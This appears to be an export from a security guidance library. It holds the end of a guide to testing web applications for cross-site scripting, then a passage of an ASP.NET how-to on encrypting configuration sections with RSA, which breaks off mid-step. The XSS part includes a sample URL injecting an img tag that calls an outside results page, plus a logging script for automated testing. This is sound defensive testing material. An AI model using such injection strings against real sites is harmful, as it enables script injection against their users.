&lt;p&gt;&amp;nbsp; quality=&amp;quot;high&amp;quot; bgcolor=&amp;quot;#ffffff&amp;quot; width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; &lt;/p&gt;
&lt;p&gt;&amp;nbsp; name=&amp;quot;flaMovie1&amp;quot; align type=&amp;quot;application/x-shockwave-flash&amp;quot; &lt;/p&gt;
&lt;p&gt;&amp;nbsp; pluginspage=&amp;quot;http://www.macromedia.com/go/getflashplayer&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;/object&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Graphical User Interface&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Testing through the UI is similar to web form testing in that the tester enters test values&amp;nbsp; directly to the screen.&amp;nbsp; In the case of GUI testing the application used is not a web browser but any other application that interacts with high risk components,
 renders HTML,&amp;nbsp; and that allows user input or otherwise receives untrusted data.&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Look for additional entry points&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Each application has its own set of entry points.&amp;nbsp; This article lists the common ones for XSS attacks.&amp;nbsp; Nonetheless, testers must explore their application for additional ways of passing data that might make it into a XSS vulnerability.&amp;nbsp; It is recommended
 to use system monitoring tools such as the ones from www.sysinternals.com and dedicated attack tools such as Burp proxy that lets you intercept and add match-and-replace rules to change the contents of HTTP packets.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Keep tuning test cases &lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes the initial test string can land in a part of the source code where XSS is possible without using a script tag.&amp;nbsp; The tester may be able to pad it a little or maybe just write the JavaScript command.&amp;nbsp; Always check if the initial input lands inside
 or within an actual command or parameter.&lt;/p&gt;
&lt;p&gt;Tags have different ways of modifying them for script injection.&amp;nbsp; To learn more about testing web applications for Cross-Site Scripting Vulnerabilities, see
&lt;a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx"&gt;http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx&lt;/a&gt;&amp;nbsp;and&amp;nbsp;
&lt;a href="http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors"&gt;
http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Consider the case of persistent XSS&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes the tester won't see the results of test cases right away.&amp;nbsp; An XSS bug might exist that takes malicious input and only sends it back if the attacker does something else like visiting another page, for instance.&amp;nbsp; Such is often the case with a persistent
 XSS attack.&lt;/p&gt;
&lt;p&gt;Consider the following case.&amp;nbsp; An application asks for a user's password hint.&amp;nbsp; When the server prompts the user for the hint, the attacker types one of the XSS test strings described before.&amp;nbsp; Then submits the registration but the server doesn't show the
 alert box.&amp;nbsp; Then the attacker has the victim browse the site's password page and ask for the hint.&amp;nbsp; When the site displays the hint the alert box appears.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;While testing persistent XSS, testers must think of all the places where the input might end up and check all of them.&amp;nbsp; They should talk to developers and use specifications to check all data stores where a persistent XSS bug can manifest.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Automating test cases&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;One can automate XSS testing by setting up a server that collects any successful XSS attacks.&amp;nbsp; For instance, can create an ASP page that has the following code, and name the page results.asp&lt;/p&gt;
&lt;p&gt;&amp;lt;%&lt;br&gt;
&amp;nbsp;&amp;nbsp; set fso = Server.CreateObject(&amp;quot;Scripting.FileSystemObject&amp;quot;)&lt;br&gt;
&amp;nbsp;&amp;nbsp; set fw = fso.CreateTextFile(&amp;quot;c:\inetpub\wwwroot\results.txt&amp;quot;,True)&lt;br&gt;
&amp;nbsp;&amp;nbsp; fw.WriteLine(&amp;quot;test case:&amp;quot;)&lt;br&gt;
&amp;nbsp;&amp;nbsp; fw.WriteLine(Request.QueryString(&amp;quot;testcase&amp;quot;))&amp;nbsp;&amp;nbsp; &lt;br&gt;
&amp;nbsp;&amp;nbsp; fw.Close &lt;br&gt;
%&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;Then generate test cases by modifying or creating new HTTP requests to the target server.&amp;nbsp; Instead of displaying alert the script invokes results.asp passing its corresponding test case number (using the src property of HTML tags).&amp;nbsp; For example the tester
 wants to cover XSS through the img tag in the password field of the login page.&amp;nbsp; He labels this test case number 17.&amp;nbsp; Then passes the following string using automation:&lt;/p&gt;
&lt;p&gt;http://www.xvulnerablesite.com/login.asp?username=any&amp;amp;password=&amp;lt;img src=&amp;quot;http://xyoursite.com/results.asp?testcase=17&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;If this test case fails then the value 17 appears in the results.txt file and the tester knows that a XSS bug was found and what caused it.&amp;nbsp; Testers can code hundreds of test cases like this and a test generator like an HTTP client to guide the automation.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;In addition, look at the different fuzzers available for free at &lt;a href="http://en.wikipedia.org/wiki/Fuzz_testing"&gt;
http://en.wikipedia.org/wiki/Fuzz_testing&lt;/a&gt;.&amp;nbsp; Many of these have the capability of executing XSS test cases and help in uncovering vulnerabilities.&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Testing for XSS bugs is not complicated but you need to be thorough.&amp;nbsp; It is important that you go through all the places where your web server renders HTML output.&amp;nbsp; There are many strings to try, many tags to look at, different methods to feed the test data,
 and even room for automation.&amp;nbsp; However, the most important thing to keep in mind is to follow your test data.&amp;nbsp; Don't just look for the alert box, but look at the code that comes back to you.&amp;nbsp; Successful XSS testing is all about knowing how to tune you test
 case data.&lt;/p&gt;
&lt;h1&gt;Additional Resources&amp;nbsp;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;XSS (Cross Site Scripting) Cheat Sheet.&amp;nbsp; Ha.ckers.com (&lt;a href="http://ha.ckers.org/xss.html"&gt;http://ha.ckers.org/xss.html&lt;/a&gt;)
&lt;/li&gt;&lt;li&gt;Testing Your Web Applications for Cross-Site Scripting Vulnerabilities, Chris Weber.
&lt;a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx"&gt;http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx&lt;/a&gt;&amp;nbsp;
&lt;/li&gt;&lt;li&gt;OWASP Testing Guide Appendix C: Fuzz Vectors. &lt;a href="http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors"&gt;
http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&amp;nbsp;Fuzz Testing.&amp;nbsp; Wikipedia. &lt;a href="http://en.wikipedia.org/wiki/Fuzz_testing"&gt;
http://en.wikipedia.org/wiki/Fuzz_testing&lt;/a&gt;&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&amp;nbsp;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/div&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>634d908c-b966-40d6-a87b-1cb465af6684</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Encrypt Configuration Sections in ASP.NET Using RSA</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Configuration</category>
    <phase>Implementation</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;This How to shows how to use the RSA Protected Configuration provider and the Aspnet_regiis.exe tool to encrypt sections of your configuration files. You can use Aspnet_regiis.exe tool to encrypt sensitive data, such as connection strings, held in the Web.config
 and Machine.config files. You can easily export and import RSA keys from server to server. This makes RSA encryption particularly effective for encrypting configuration files used on multiple servers in a Web farm.&lt;/p&gt;
&lt;h1&gt;Contents&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Objectives &lt;/li&gt;&lt;li&gt;Overview &lt;/li&gt;&lt;li&gt;Summary of Steps &lt;/li&gt;&lt;li&gt;Step 1. Identify the Configuration Sections to Be Encrypted &lt;/li&gt;&lt;li&gt;Step 2. Choose Machine-Level or User-Level Containers &lt;/li&gt;&lt;li&gt;Step 3. Encrypt Your Configuration File Data &lt;/li&gt;&lt;li&gt;Web Farm Scenarios &lt;/li&gt;&lt;li&gt;Additional Resources &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Learn about key changes for encrypting sensitive data in configuration files in ASP.NET.
&lt;/li&gt;&lt;li&gt;Learn how to choose between machine-level and user-level containers. &lt;/li&gt;&lt;li&gt;Know which sections can and cannot be encrypted with the RSA protected configuration provider.
&lt;/li&gt;&lt;li&gt;Use the RSA protected configuration provider to encrypt connection strings. &lt;/li&gt;&lt;li&gt;Create RSA key containers. &lt;/li&gt;&lt;li&gt;Import and export RSA keys across multiple servers in a Web farm. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Overview&lt;/h1&gt;
&lt;p&gt;Configuration files such as the Web.config file are often used to hold sensitive information, including user names, passwords, database connection strings, and encryption keys. The sections that usually contain sensitive information that you need to encrypt
 are the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;appSettings&amp;gt;. This section contains custom application settings. &lt;/li&gt;&lt;li&gt;&amp;lt;connectionStrings&amp;gt;. This section contains connection strings. &lt;/li&gt;&lt;li&gt;&amp;lt;identity&amp;gt;. This section can contain impersonation credentials. &lt;/li&gt;&lt;li&gt;&amp;lt;sessionState&amp;gt;. This section contains the connection string for the out-of-process session state provider.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data.&lt;/p&gt;
&lt;h1&gt;Summary of Steps&lt;/h1&gt;
&lt;p&gt;To encrypt configuration sections by using the RSA protected configuration provider, perform the following steps:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1. Identify the configuration sections to be encrypted. &lt;/li&gt;&lt;li&gt;Step 2. Choose machine-level or user-level key containers. &lt;/li&gt;&lt;li&gt;Step 3. Encrypt your configuration file data. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Step 1. Identify the Configuration Sections to Be Encrypted&lt;/h1&gt;
&lt;p&gt;Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data.&lt;/p&gt;
&lt;h2&gt;Sections You Cannot Encrypt Using Protected Configuration&lt;/h2&gt;
&lt;p&gt;If you store sensitive data in any of the following configuration sections, you cannot encrypt it by using a protected configuration provider and the Aspnet_regiis.exe tool:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;processModel&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;runtime&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;mscorlib&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;startup&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;system.runtime.remoting&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;configProtectedData&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;satelliteassemblies&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;cryptographySettings&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;cryptoNameMapping&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;cryptoClasses&amp;gt; &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For the configuration sections listed, you should use the Aspnet_setreg.exe tool, which is also available for previous versions of the .NET Framework.&lt;/p&gt;
&lt;h1&gt;Step 2. Choose Machine-Level or User-Level Key Containers&lt;/h1&gt;
&lt;p&gt;The &lt;strong&gt;RSAProtectedConfigurationProvider&lt;/strong&gt; supports machine-level and user-level key containers for key storage. Machine-level key containers are available to all users, but a user-level key container is available to that user only.&lt;/p&gt;
&lt;p&gt;The choice of container depends largely on whether or not your application shares a server with other applications and whether or not sensitive data must be kept private for each application.&lt;/p&gt;
&lt;h2&gt;Machine Key Container&lt;/h2&gt;
&lt;p&gt;Use a machine-level key container in the following situations: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Your application runs on its own dedicated server with no other applications.
&lt;/li&gt;&lt;li&gt;You have multiple applications on the same server and you want those applications to be able to share sensitive information and the same encryption key.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;RSA machine key containers are stored in the following folder: &lt;/p&gt;
&lt;p&gt;\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys&lt;/p&gt;
&lt;h2&gt;User Key Container&lt;/h2&gt;
&lt;p&gt;Use a user-level key container if you run your application in a shared hosting environment and you want to make sure that your application's sensitive data is not accessible to other applications on the server. In this situation, each application should
 have a separate identity and the resources for the application—such as files, and databases—should be restricted to that identity.&lt;/p&gt;
&lt;p&gt;RSA user-level key containers are stored in the following folder:&lt;/p&gt;
&lt;p&gt;\Documents and Settings\{UserName}\Application Data\Microsoft\Crypto\RSA&lt;/p&gt;
&lt;h1&gt;Step 3. Encrypt Your Configuration File Data&lt;/h1&gt;
&lt;p&gt;This step shows you how to encrypt a connection string in the Web.config file. It shows you how to do this with the machine store and then with the user store.&lt;/p&gt;
&lt;h2&gt;Using RSA with a Machine-Level Key Container to Encrypt a Connection String in Web.Config&lt;/h2&gt;
&lt;p&gt;The &lt;strong&gt;RSAProtectedConfigurationProvider&lt;/strong&gt; is the default provider and is configured to use the machine-level key container.&lt;/p&gt;
&lt;h3&gt;To encrypt the connectionStrings section in Web.config &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Create a new Web site named MachineRSA. Make sure that this directory is configured as a virtual directory.
&lt;/li&gt;&lt;li&gt;Add a Web.config configuration file to this directory. &lt;/li&gt;&lt;li&gt;Add a sample &lt;strong&gt;connectionString&lt;/strong&gt; similar to the following example:
&lt;div&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionString=&amp;quot;Initial Catalog=aspnetdb;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; data source=localhost;Integrated Security=SSPI;&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; providerName=&amp;quot;System.Data.SqlClient&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Run the following command from a .NET command prompt to encrypt the &lt;strong&gt;connectionStrings&lt;/strong&gt; section:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineRSA&amp;quot;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;The above command with the-&lt;strong&gt;app&lt;/strong&gt; switch assumes that there is an IIS virtual directory called MachineRSA. If you are using the Visual Studio Web server instead of IIS, use the-&lt;strong&gt;pef&lt;/strong&gt; switch, which allows you to specify the physical
 directory location of your configuration file. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;aspnet_regiis.exe -pef &amp;quot;connectionStrings&amp;quot; C:\Projects\MachineRSA&lt;/strong&gt;
&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;The Aspnet_regiis.exe utility tool is located in the following directory:&lt;/blockquote&gt;
&lt;blockquote&gt;%WinDir%\Microsoft.NET\Framework\&amp;lt;&lt;em&gt;versionNumber&lt;/em&gt;&amp;gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;-pe&lt;/strong&gt; switch specifies the configuration section to encrypt. This is the XML element name of the configuration section.
&lt;p&gt;For nested elements, such as the &amp;lt;&lt;strong&gt;pages&lt;/strong&gt;&amp;gt; section which is inside &amp;lt;&lt;strong&gt;system.web&lt;/strong&gt;&amp;gt;, the XML name must include the containing section groups; for example:
&lt;strong&gt;&amp;quot;system.web/pages&amp;quot;&lt;/strong&gt;. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;The &lt;strong&gt;-pef&lt;/strong&gt; switch specifies the configuration section to encrypt and allows you to supply the physical directory path for your configuration file.
&lt;/li&gt;&lt;li&gt;The &lt;strong&gt;-app&lt;/strong&gt; switch specifies your Web application's virtual path. If it is a nested application, you need to specify the nested path from the root directory; for example,
&lt;strong&gt;&amp;quot;/test/aspnet/MachineRSA&amp;quot;&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Because you are using the default provider with default settings, you do not need to use the-&lt;strong&gt;prov&lt;/strong&gt; switch, which specifies the provider name.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Encrypting configuration section...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;The RSA machine key containers are stored in the following folder:&lt;/blockquote&gt;
&lt;blockquote&gt;\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;Review the Web.config file, and examine the changes. The following elements are created:
&lt;ul&gt;
&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptedData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptionMethod&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;KeyInfo&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptedKey&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;KeyName&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherValue&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Your modified Web.Config file, with the &lt;strong&gt;connectionStrings&lt;/strong&gt; section encrypted, should be similar to the following example:
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;...&lt;br&gt;&amp;lt;connectionStrings configProtectionProvider=&amp;quot;RsaProtectedConfigurationProvider&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptedData Type=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#Element"&gt;http://www.w3.org/2001/04/xmlenc#Element&lt;/a&gt;&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;              xmlns=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc"&gt;http://www.w3.org/2001/04/xmlenc&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptionMethod Algorithm=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"&gt;http://www.w3.org/2001/04/xmlenc#tripledes-cbc&lt;/a&gt;&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyInfo xmlns=&amp;quot;&lt;a href="http://www.w3.org/2000/09/xmldsig"&gt;http://www.w3.org/2000/09/xmldsig&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptedKey xmlns=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc"&gt;http://www.w3.org/2001/04/xmlenc&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptionMethod Algorithm=&amp;quot;&lt;a href="http://www.w3.org/2001/04/xmlenc#rsa-1_5"&gt;http://www.w3.org/2001/04/xmlenc#rsa-1_5&lt;/a&gt;&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyInfo xmlns=&amp;quot;&lt;a href="http://www.w3.org/2000/09/xmldsig"&gt;http://www.w3.org/2000/09/xmldsig&lt;/a&gt;#&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;KeyName&amp;gt;Rsa Key&amp;lt;/KeyName&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/KeyInfo&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherValue&amp;gt;R7cyuRk&amp;#43;SXJoimz7wlOpJr/YLeADGnwJVcmElHbrG/&lt;br&gt;                         B5dDTE4C9rzSmmTsbJ9Xcl2oDQt1qYma9L7pzQsQQYqLrkajqJ4i6ZQH1cmiot8ja7Vh&amp;#43;yItes7TRU1AoXN9T0mbX5H1Axm0O3X/&lt;br&gt;                         285/MdXXTUlPkDMAZXmzNVeEJHSCE=&lt;br&gt;            &amp;lt;/CipherValue&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/EncryptedKey&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/KeyInfo&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherValue&amp;gt;d2&amp;#43;&amp;#43;QtjcVwIkJLsye&amp;#43;dNJbCveORxeWiVSJIbcQQqAFofhay1wMci8FFlbQWttiRYFcvxrmVfNSxoZV8GjfPtppiodhOzQZ&amp;#43;0/&lt;br&gt;                     QIFiU9Cifqh/T/7JyFkFSn13bTKjbYmHObKAzZ&amp;#43;Eg6gCXBxsVErzH9GRphlsz5ru1BytFYxo/&lt;br&gt;                     lUGRvZfpLHLYWRuFyLXnxNoAGfL1mpQM7M46x5YWRMsNsNEKTo/PU9/Jvnh/&lt;br&gt;                     lT&amp;#43;GlcgCs2JRpyzSfKE7zSJH&amp;#43;TpIRtd86PwQ5HG3Pd2frYdYw0rmlmlI9D&lt;br&gt;        &amp;lt;/CipherValue&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/EncryptedData&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/connectionStrings&amp;gt;&lt;br&gt;...&lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption work correctly.
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Clear text connection string is: &amp;quot; &amp;#43; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;       ConfigurationManager.ConnectionString[&amp;quot;MyLocalSQLServer&amp;quot;].ConnectionString);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body /&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;MyLocalSQLServer is the name of the connection string you previously specified in the Web.config file.
&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;If your ASP.NET application identity does not have access to the .NET Framework configuration key store, the following message is returned:&lt;/blockquote&gt;
&lt;div&gt;
&lt;pre&gt;Parser Error Message: Failed to decrypt using provider 'RsaProtectedConfigurationProvider'.&lt;br&gt;Error message from the provider: The handle is invalid.  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;&lt;strong&gt;To &lt;/strong&gt;grant access to the ASP.NET application identity&lt;/strong&gt;&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;If you are not sure which identity to use, check the identity from a Web page by using the following code:
&lt;div&gt;
&lt;pre&gt;using System.Security.Principal;&lt;br&gt;...&lt;br&gt;protected void Page_Load(object sender, EventArgs e)&lt;br&gt;{&lt;br&gt;&amp;nbsp; Response.Write(WindowsIdentity.GetCurrent().Name);&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;By default, ASP.NET applications on Windows Server 2003 run using the NT Authority\Network Service account. Open a .NET command prompt, and use the following command to give this account access to the NetFrameworkConfigurationKey store:
&lt;blockquote&gt;&lt;strong&gt;&lt;strong&gt;aspnet_regiis&lt;/strong&gt; -pa &amp;quot;NetFrameworkConfigurationKey&amp;quot; &amp;quot;NT Authority\Network Service&amp;quot;&lt;/strong&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;&lt;strong&gt;If&lt;/strong&gt; the command runs successfully you will see the following output:&lt;/blockquote&gt;
&lt;div&gt;
&lt;pre&gt;Adding ACL for access to the RSA Key container...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;You &lt;/strong&gt;can check the ACL of the file in the following folder:&lt;/blockquote&gt;
&lt;blockquote&gt;&lt;strong&gt;&lt;strong&gt;\Documents&lt;/strong&gt; and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys&lt;/strong&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;&lt;strong&gt;Your&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;RSA key container file is the file in this folder with the most recent timestamp.&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;To change the &lt;strong&gt;connectionStrings&lt;/strong&gt; section back to clear text, run the following command from the command prompt:
